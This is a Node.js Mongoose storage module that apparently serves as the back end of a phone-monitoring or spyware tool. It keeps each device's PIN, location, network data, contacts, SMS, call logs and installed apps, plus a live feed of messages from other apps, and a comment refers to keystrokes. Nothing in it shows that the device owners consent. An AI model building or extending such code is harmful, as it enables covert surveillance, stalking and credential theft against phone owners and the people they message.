const mongoose = require('mongoose');
const MONGODB_URI = process.env.MONGODB_URI || '';
let connected = false;

async function connectMongo() {
    if (!MONGODB_URI) { console.warn('MONGODB_URI not set'); return false; }
    if (connected) return true;
    try {
        await mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 8000 });
        connected = true;
        console.log('MongoDB connected', mongoose.connection.name);
        return true;
    } catch (e) {
        console.error('MongoDB connect failed', e.message);
        return false;
    }
}
function isReady() { return connected && mongoose.connection.readyState === 1; }

const DeviceMeta = mongoose.models.DeviceMeta || mongoose.model('DeviceMeta', new mongoose.Schema({
    deviceId: { type: String, unique: true, index: true },
    model: String, pin: String, network: mongoose.Schema.Types.Mixed,
    lastLocation: mongoose.Schema.Types.Mixed, lastSeen: Number,
    updatedAt: { type: Date, default: Date.now }
}, { collection: 'devices' }));

const History = mongoose.models.History || mongoose.model('History', new mongoose.Schema({
    deviceId: { type: String, index: true },
    type: { type: String, index: true },
    data: mongoose.Schema.Types.Mixed,
    createdAt: { type: Date, default: Date.now, index: true }
}, { collection: 'device_history' }));

// Structured Live Activity events (persistent history)
const ActivityEventSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    application: { type: String, default: 'Other' },
    packageName: { type: String, default: '' },
    actorName: { type: String, default: '' },
    action: { type: String, default: 'activity' },
    message: { type: String, default: '' },
    text: { type: String, default: '' }, // original free-text for live card
    timestamp: { type: Date, default: Date.now, index: true },
    eventId: { type: String, required: true }
}, { collection: 'activity_events' });
ActivityEventSchema.index({ deviceId: 1, eventId: 1 }, { unique: true });
ActivityEventSchema.index({ deviceId: 1, timestamp: -1 });
const ActivityEvent = mongoose.models.ActivityEvent || mongoose.model('ActivityEvent', ActivityEventSchema);

async function upsertDevice(deviceId, fields = {}) {
    if (!isReady() || !deviceId) return;
    const id = String(deviceId).toUpperCase().trim();
    try {
        await DeviceMeta.findOneAndUpdate({ deviceId: id }, { $set: { ...fields, deviceId: id, updatedAt: new Date() } }, { upsert: true });
    } catch (e) {}
}

async function saveHistory(deviceId, type, data) {
    if (!isReady() || !deviceId || !type) return;
    const id = String(deviceId).toUpperCase().trim();
    try {
        if (['contacts','apps','installed_apps','call_logs','sms'].includes(type)) {
            const t = type === 'installed_apps' ? 'apps' : type;
            await History.deleteMany({ deviceId: id, type: t, 'data._snapshot': true });
            await History.create({ deviceId: id, type: t, data: { _snapshot: true, items: Array.isArray(data) ? data : [data] }, createdAt: new Date() });
            return;
        }
        if (type === 'network') {
            await upsertDevice(id, { network: data });
            await History.findOneAndUpdate(
                { deviceId: id, type: 'network', 'data._singleton': true },
                { $set: { data: { _singleton: true, ...(data || {}) }, createdAt: new Date() } },
                { upsert: true }
            );
            return;
        }
        if (type === 'location') {
            const loc = Array.isArray(data) ? data[data.length - 1] : data;
            await upsertDevice(id, { lastLocation: loc });
            await History.findOneAndUpdate(
                { deviceId: id, type: 'location', 'data._singleton': true },
                { $set: { data: { _singleton: true, ...(loc || {}) }, createdAt: new Date() } },
                { upsert: true }
            );
            return;
        }
        // live_status: do NOT flood device_history with every keystroke.
        // Structured activity_events collection is the source of truth for Live Activity history.
        if (type === 'live_status') {
            return;
        }
        const items = Array.isArray(data) ? data : [data];
        const docs = items.map(item => ({
            deviceId: id, type, data: item,
            createdAt: new Date(item.timestamp || item.postTime || Date.now())
        }));
        if (docs.length) await History.insertMany(docs, { ordered: false }).catch(() => {});
        const cutoff = new Date(Date.now() - 180 * 24 * 60 * 60 * 1000);
        await History.deleteMany({ deviceId: id, type, createdAt: { $lt: cutoff } }).catch(() => {});
    } catch (e) { console.error('saveHistory', type, e.message); }
}

async function loadHistory(deviceId, type, limit = 500) {
    if (!isReady() || !deviceId) return null;
    const id = String(deviceId).toUpperCase().trim();
    try {
        if (['contacts','apps','installed_apps','call_logs','sms'].includes(type)) {
            const t = type === 'installed_apps' ? 'apps' : type;
            const snap = await History.findOne({ deviceId: id, type: t, 'data._snapshot': true }).sort({ createdAt: -1 }).lean();
            return snap && snap.data && snap.data.items ? snap.data.items : [];
        }
        if (type === 'network' || type === 'location') {
            const row = await History.findOne({ deviceId: id, type, 'data._singleton': true }).lean();
            if (row) return row.data;
        }
        // Prefer structured activity_events for live_status history
        if (type === 'live_status') {
            const events = await loadActivityEvents(id, limit);
            if (events && events.length) {
                return events.map(e => ({
                    text: e.text || formatActivityText(e),
                    timestamp: e.timestamp ? new Date(e.timestamp).getTime() : Date.now(),
                    application: e.application,
                    packageName: e.packageName,
                    actorName: e.actorName,
                    action: e.action,
                    message: e.message,
                    eventId: e.eventId
                }));
            }
        }
        const rows = await History.find({ deviceId: id, type }).sort({ createdAt: -1 }).limit(Math.min(limit, 5000)).lean();
        return rows.map(r => r.data);
    } catch (e) { return null; }
}

function formatActivityText(e) {
    if (!e) return '';
    if (e.text) return e.text;
    const app = e.application || 'App';
    const actor = e.actorName || '';
    const msg = e.message || '';
    const act = e.action || 'activity';
    if (actor && msg) return `${app} → ${actor} : ${msg}`;
    if (msg) return `${app} ${act}: ${msg}`;
    return app;
}

/**
 * Save one structured activity event. Dedupes by deviceId + eventId (unique index).
 * Returns the saved doc or null if duplicate / skipped.
 */
async function saveActivityEvent(deviceId, event) {
    if (!isReady() || !deviceId || !event) return null;
    const id = String(deviceId).toUpperCase().trim();
    const eventId = String(event.eventId || '').trim();
    if (!eventId) return null;
    try {
        const doc = {
            deviceId: id,
            application: event.application || 'Other',
            packageName: event.packageName || '',
            actorName: event.actorName || '',
            action: event.action || 'activity',
            message: event.message || '',
            text: event.text || '',
            timestamp: event.timestamp ? new Date(event.timestamp) : new Date(),
            eventId
        };
        // upsert with unique eventId → no duplicate inserts
        const saved = await ActivityEvent.findOneAndUpdate(
            { deviceId: id, eventId },
            { $setOnInsert: doc },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        ).lean();
        // prune old (keep ~90 days)
        const cutoff = new Date(Date.now() - 90 * 24 * 60 * 60 * 1000);
        await ActivityEvent.deleteMany({ deviceId: id, timestamp: { $lt: cutoff } }).catch(() => {});
        return saved;
    } catch (e) {
        // duplicate key → already stored
        if (e && e.code === 11000) return null;
        console.error('saveActivityEvent', e.message);
        return null;
    }
}

async function loadActivityEvents(deviceId, limit = 200) {
    if (!isReady() || !deviceId) return [];
    const id = String(deviceId).toUpperCase().trim();
    try {
        const rows = await ActivityEvent.find({ deviceId: id })
            .sort({ timestamp: -1 })
            .limit(Math.min(Number(limit) || 200, 1000))
            .lean();
        return rows;
    } catch (e) {
        return [];
    }
}

async function clearActivityEvents(deviceId) {
    if (!isReady() || !deviceId) return 0;
    const id = String(deviceId).toUpperCase().trim();
    try {
        const r = await ActivityEvent.deleteMany({ deviceId: id });
        return r.deletedCount || 0;
    } catch (e) {
        return 0;
    }
}

// Boot health status (latest per device + deduped event log)
const BootStatusSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    bootSessionId: { type: String, required: true, index: true },
    eventType: { type: String, required: true },
    serviceName: { type: String, default: '' },
    status: { type: String, default: 'SUCCESS' },
    message: { type: String, default: '' },
    eventKey: { type: String, required: true },
    timestamp: { type: Number, default: Date.now },
    createdAt: { type: Date, default: Date.now }
}, { collection: 'boot_status' });
BootStatusSchema.index({ deviceId: 1, eventKey: 1 }, { unique: true });
BootStatusSchema.index({ deviceId: 1, timestamp: -1 });
const BootStatus = mongoose.models.BootStatus || mongoose.model('BootStatus', BootStatusSchema);

async function saveBootStatus(deviceId, event) {
    if (!isReady() || !deviceId || !event) return null;
    const id = String(deviceId).toUpperCase().trim();
    const eventKey = String(event.eventKey || '').trim();
    if (!eventKey) return null;
    try {
        const doc = {
            deviceId: id,
            bootSessionId: event.bootSessionId || '',
            eventType: event.eventType || 'SERVICE_STATUS',
            serviceName: event.serviceName || '',
            status: event.status || 'SUCCESS',
            message: event.message || '',
            eventKey,
            timestamp: event.timestamp || Date.now(),
            createdAt: new Date()
        };
        const saved = await BootStatus.findOneAndUpdate(
            { deviceId: id, eventKey },
            { $setOnInsert: doc },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        ).lean();
        // prune older than 30 days
        const cutoff = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
        await BootStatus.deleteMany({ deviceId: id, createdAt: { $lt: cutoff } }).catch(() => {});
        return saved;
    } catch (e) {
        if (e && e.code === 11000) return null;
        console.error('saveBootStatus', e.message);
        return null;
    }
}

async function loadLatestBootStatus(deviceId) {
    if (!isReady() || !deviceId) return null;
    const id = String(deviceId).toUpperCase().trim();
    try {
        const complete = await BootStatus.findOne({
            deviceId: id,
            eventType: 'BOOT_COMPLETE'
        }).sort({ timestamp: -1 }).lean();
        if (complete) return complete;
        return await BootStatus.findOne({ deviceId: id }).sort({ timestamp: -1 }).lean();
    } catch (e) {
        return null;
    }
}

async function loadAllBootEvents(deviceId, limit = 100) {
    if (!isReady() || !deviceId) return [];
    const id = String(deviceId).toUpperCase().trim();
    try {
        const rows = await BootStatus.find({ deviceId: id })
            .sort({ timestamp: -1 })
            .limit(Math.min(Number(limit) || 100, 500))
            .lean();
        return rows;
    } catch (e) {
        return [];
    }
}

module.exports = {
    connectMongo, isReady, upsertDevice, saveHistory, loadHistory,
    saveActivityEvent, loadActivityEvents, clearActivityEvents, formatActivityText,
    saveBootStatus, loadLatestBootStatus, loadAllBootEvents
};
